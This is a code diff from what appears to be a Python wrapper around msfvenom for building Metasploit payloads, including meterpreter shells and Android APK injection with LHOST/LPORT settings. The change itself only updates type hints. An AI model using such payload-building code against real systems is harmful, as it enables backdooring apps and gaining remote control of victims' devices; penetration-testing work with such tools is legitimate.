@@ -1,7 +1,6 @@
 # Developer: Sreeraj
 # GitHub: https://github.com/s-r-e-e-r-a-j
 
-from typing import Optional, List
 from .utils import run_cmd, info, ok, fail, warn, ask
 import os
 
@@ -139,11 +138,11 @@ FMT = {
     'java_meterpreter_bind_tcp': 'jar'
 }
 
-def build_cmd(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, encoder: Optional[str] = None, iterations: int = 1, badchars: Optional[str] = None) -> List[str]:
+def build_cmd(key: str, lhost: str, lport: int, out: str, infile: str | None = None, encoder: str | None = None, iterations: int = 1, badchars: str | None = None) -> list[str]:
     payload = MAP.get(key)
     if not payload:
         raise ValueError('unknown payload')
-    cmd: List[str] = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}']
+    cmd: list[str] = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}']
     if infile and key.startswith('android'):
         cmd += ['-x', infile]
 
@@ -192,7 +191,7 @@ def build_cmd(key: str, lhost: str, lport: int, out: str, infile: Optional[str] 
     cmd += ['-o', out]
     return cmd
 
-def generate(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, encoder: Optional[str] = None, iterations: int = 1, badchars: Optional[str] = None, dry: bool = False) -> bool:
+def generate(key: str, lhost: str, lport: int, out: str, infile: str | None = None, encoder: str | None = None, iterations: int = 1, badchars: str | None = None, dry: bool = False) -> bool:
     cmd = build_cmd(key, lhost, lport, out, infile, encoder, iterations, badchars)
     info(' '.join(cmd))
     if dry:
